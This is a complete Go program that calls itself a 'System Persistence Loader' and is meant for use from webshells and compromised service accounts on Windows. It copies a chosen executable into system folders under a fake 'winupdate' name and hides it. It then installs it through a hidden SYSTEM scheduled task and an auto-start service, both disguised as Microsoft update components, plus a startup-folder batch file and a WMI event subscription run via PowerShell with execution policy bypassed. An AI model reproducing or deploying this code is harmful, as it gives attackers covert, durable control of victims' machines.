package main

import (
	"crypto/sha256"
	"encoding/hex"
	"flag"
	"fmt"
	"io"
	"io/ioutil"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"syscall"
	"time"
)

// Copy file to destination
func copyFile(src, dst string) error {
	sourceFile, err := os.Open(src)
	if err != nil {
		return err
	}
	defer sourceFile.Close()

	destDir := filepath.Dir(dst)
	os.MkdirAll(destDir, 0755)

	destFile, err := os.Create(dst)
	if err != nil {
		return err
	}
	defer destFile.Close()

	_, err = io.Copy(destFile, sourceFile)
	return err
}

// Get system-accessible locations for service accounts
func getSystemLocations() []string {
	return []string{
		"C:\\Windows\\Temp",
		"C:\\Temp",
		"C:\\Windows\\System32\\Tasks", 
		"C:\\ProgramData",
		"C:\\Windows\\System32\\spool",
		"C:\\Windows\\System32\\LogFiles",
		"C:\\Windows\\Logs",
		"C:\\inetpub\\temp",
		"C:\\inetpub\\logs",
	}
}

// Create scheduled task for persistence (works with system accounts)
func createScheduledTask(executablePath string) error {
	taskName := "MicrosoftWindowsUpdate" + fmt.Sprintf("%d", time.Now().Unix()%10000)
	
	// Create XML for scheduled task
	xmlContent := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Date>%s</Date>
    <Author>Microsoft Corporation</Author>
    <Description>Windows Update Task</Description>
  </RegistrationInfo>
  <Triggers>
    <BootTrigger>
      <Enabled>true</Enabled>
    </BootTrigger>
    <TimeTrigger>
      <StartBoundary>%s</StartBoundary>
      <Enabled>true</Enabled>
      <Repetition>
        <Interval>PT30M</Interval>
      </Repetition>
    </TimeTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <UserId>S-1-5-18</UserId>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>%s</Command>
    </Exec>
  </Actions>
</Task>`, time.Now().Format("2006-01-02T15:04:05"), time.Now().Format("2006-01-02T15:04:05"), executablePath)

	// Write XML to temp file
	tempDir := "C:\\Windows\\Temp"
	xmlFile := filepath.Join(tempDir, taskName+".xml")
	
	err := ioutil.WriteFile(xmlFile, []byte(xmlContent), 0644)
	if err != nil {
		return fmt.Errorf("failed to write XML file: %v", err)
	}
	defer os.Remove(xmlFile)

	// Create scheduled task
	cmd := exec.Command("schtasks", "/create", "/tn", taskName, "/xml", xmlFile, "/f")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	
	output, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Errorf("schtasks failed: %v - %s", err, string(output))
	}

	fmt.Printf("✓ Scheduled task created: %s\n", taskName)
	return nil
}

// Create WMI-based persistence 
func createWMIPersistence(executablePath string) error {
	eventName := "WindowsDefenderUpdate" + fmt.Sprintf("%d", time.Now().Unix()%1000)
	
	// Create WMI event consumer
	wmiScript := fmt.Sprintf(`
		$consumer = Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" -Arguments @{
			Name='%s'
			EventNamespace='root\cimv2'
			QueryLanguage='WQL'
			Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfRawData_PerfOS_System'"
		}
		
		$action = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments @{
			Name='%s'
			CommandLineTemplate='%s'
		}
		
		Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{
			Filter=$consumer
			Consumer=$action
		}
	`, eventName, eventName, executablePath)

	// Write PowerShell script
	scriptFile := filepath.Join("C:\\Windows\\Temp", "wmi_setup.ps1")
	err := ioutil.WriteFile(scriptFile, []byte(wmiScript), 0644)
	if err != nil {
		return fmt.Errorf("failed to write WMI script: %v", err)
	}
	defer os.Remove(scriptFile)

	// Execute PowerShell script
	cmd := exec.Command("powershell", "-ExecutionPolicy", "Bypass", "-File", scriptFile)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	
	output, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Errorf("WMI setup failed: %v - %s", err, string(output))
	}

	fmt.Printf("✓ WMI persistence created: %s\n", eventName)
	return nil
}

// Create service-based persistence
func createServicePersistence(executablePath string) error {
	serviceName := "WindowsUpdateSvc" + fmt.Sprintf("%d", time.Now().Unix()%1000)
	displayName := "Windows Update Service Helper"
	
	// Create Windows service
	cmd := exec.Command("sc", "create", serviceName, 
		"binpath=", executablePath,
		"type=", "own",
		"start=", "auto",
		"DisplayName=", displayName)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	
	output, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Errorf("service creation failed: %v - %s", err, string(output))
	}

	// Start the service
	cmd = exec.Command("sc", "start", serviceName)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	cmd.Run() // Don't fail if service doesn't start immediately

	fmt.Printf("✓ Service created: %s\n", serviceName)
	return nil
}

// Create startup folder persistence (if accessible)
func createStartupPersistence(executablePath string) error {
	startupDirs := []string{
		"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup",
		"C:\\Users\\All Users\\Microsoft\\Windows\\Start Menu\\Programs\\Startup",
	}

	for _, startupDir := range startupDirs {
		if _, err := os.Stat(startupDir); err == nil {
			batchName := "WindowsUpdate.bat"
			batchPath := filepath.Join(startupDir, batchName)
			
			batchContent := fmt.Sprintf(`@echo off
start "" "%s"`, executablePath)
			
			err := ioutil.WriteFile(batchPath, []byte(batchContent), 0644)
			if err == nil {
				fmt.Printf("✓ Startup folder: %s\n", batchPath)
				return nil
			}
		}
	}
	
	return fmt.Errorf("no accessible startup folders")
}

// Create system-level persistence for service accounts
func createSystemPersistence(targetPath string) error {
	if runtime.GOOS != "windows" {
		return fmt.Errorf("Windows only")
	}

	absTargetPath, err := filepath.Abs(targetPath)
	if err != nil {
		return err
	}

	// Generate unique name
	hash := sha256.Sum256([]byte(absTargetPath))
	uniqueName := "winupdate" + hex.EncodeToString(hash[:3]) + ".exe"

	// Try system-accessible locations
	systemLocations := getSystemLocations()
	
	var persistentPath string
	var copySuccess bool

	fmt.Printf("Trying %d system locations...\n", len(systemLocations))

	for i, location := range systemLocations {
		testPath := filepath.Join(location, uniqueName)
		
		fmt.Printf("[%d/%d] Trying: %s\n", i+1, len(systemLocations), testPath)
		
		if err := copyFile(absTargetPath, testPath); err == nil {
			persistentPath = testPath
			copySuccess = true
			fmt.Printf("✓ SUCCESS: Copied to %s\n", testPath)
			break
		} else {
			fmt.Printf("✗ Failed: %v\n", err)
		}
	}

	if !copySuccess {
		return fmt.Errorf("failed to copy to any system location")
	}

	// Try multiple persistence methods
	var successCount int
	persistenceMethods := []struct {
		name string
		fn   func(string) error
	}{
		{"Scheduled Task", createScheduledTask},
		{"Windows Service", createServicePersistence},
		{"Startup Folder", createStartupPersistence},
		{"WMI Persistence", createWMIPersistence},
	}

	fmt.Println("\nTrying persistence methods...")
	for _, method := range persistenceMethods {
		fmt.Printf("Attempting: %s... ", method.name)
		if err := method.fn(persistentPath); err == nil {
			fmt.Printf("SUCCESS\n")
			successCount++
		} else {
			fmt.Printf("FAILED (%v)\n", err)
		}
	}

	if successCount == 0 {
		return fmt.Errorf("all persistence methods failed")
	}

	fmt.Printf("\n✓ Created %d persistence methods\n", successCount)
	fmt.Printf("✓ Persistent file: %s\n", persistentPath)

	// Set file attributes
	if runtime.GOOS == "windows" {
		cmd := exec.Command("attrib", "+h", "+s", persistentPath)
		cmd.Run()
	}

	return nil
}

// Check if running as system service account
func isSystemAccount() bool {
	username := os.Getenv("USERNAME")
	return strings.HasSuffix(username, "$") || 
		   username == "SYSTEM" || 
		   username == "LOCAL SERVICE" || 
		   username == "NETWORK SERVICE"
}

// Execute target
func executeTarget(targetPath string) error {
	if _, err := os.Stat(targetPath); os.IsNotExist(err) {
		return fmt.Errorf("target not found: %s", targetPath)
	}

	absPath, err := filepath.Abs(targetPath)
	if err != nil {
		return err
	}

	fmt.Printf("Launching: %s\n", absPath)

	cmd := exec.Command(absPath)
	
	if runtime.GOOS == "windows" {
		cmd.SysProcAttr = &syscall.SysProcAttr{
			HideWindow:    true,
			CreationFlags: 0x08000000 | 0x00000200,
		}
	}

	err = cmd.Start()
	if err != nil {
		return fmt.Errorf("failed to start: %v", err)
	}

	fmt.Printf("✓ Process started (PID: %d)\n", cmd.Process.Pid)
	return nil
}

func main() {
	var helpFlag = flag.Bool("h", false, "Show help")
	var execFlag = flag.String("u", "", "Execute target")
	var persistFlag = flag.Bool("persist", false, "Create system persistence")
	var infoFlag = flag.Bool("info", false, "Show system info")
	flag.Parse()

	if *helpFlag {
		fmt.Printf("%s - System Persistence Loader V3\n", filepath.Base(os.Args[0]))
		fmt.Printf("Usage:\n")
		fmt.Printf("  %s -u <executable> -persist   - Execute with system persistence\n", os.Args[0])
		fmt.Printf("  %s -u <executable>            - Just execute\n", os.Args[0])
		fmt.Printf("  %s -info                      - Show system info\n", os.Args[0])
		fmt.Printf("  %s -h                         - Show help\n", os.Args[0])
		fmt.Printf("\nDesigned for system/service accounts and webshells\n")
		return
	}

	if *infoFlag {
		fmt.Printf("=== System Information V3 ===\n")
		fmt.Printf("Current directory: %s\n", func() string { pwd, _ := os.Getwd(); return pwd }())
		fmt.Printf("USERPROFILE: %s\n", os.Getenv("USERPROFILE"))
		fmt.Printf("USERNAME: %s\n", os.Getenv("USERNAME"))
		fmt.Printf("COMPUTERNAME: %s\n", os.Getenv("COMPUTERNAME"))
		fmt.Printf("System account: %t\n", isSystemAccount())
		
		fmt.Println("\nAccessible system locations:")
		systemLocs := getSystemLocations()
		for i, loc := range systemLocs {
			if _, err := os.Stat(loc); err == nil {
				fmt.Printf("  [%d] ✓ %s\n", i+1, loc)
			} else {
				fmt.Printf("  [%d] ✗ %s\n", i+1, loc)
			}
		}
		return
	}

	if *execFlag == "" {
		fmt.Printf("Error: No target specified. Use -h for help.\n")
		return
	}

	fmt.Printf("=== System Persistence Loader V3 ===\n")
	fmt.Printf("Running from: %s\n", func() string { pwd, _ := os.Getwd(); return pwd }())
	fmt.Printf("User context: %s\n", os.Getenv("USERNAME"))
	
	if isSystemAccount() {
		fmt.Printf("✓ System service account detected - using system persistence methods\n")
	}

	if *persistFlag {
		fmt.Printf("Creating system persistence for: %s\n", *execFlag)
		
		if err := createSystemPersistence(*execFlag); err != nil {
			fmt.Printf("✗ System persistence failed: %v\n", err)
			fmt.Println("Trying to execute anyway...")
		} else {
			fmt.Printf("✓ System persistence created successfully\n")
		}
	}

	fmt.Printf("Executing target...\n")
	if err := executeTarget(*execFlag); err != nil {
		fmt.Printf("✗ Execution failed: %v\n", err)
		return
	}

	time.Sleep(1 * time.Second)
	fmt.Printf("✓ Complete\n")
}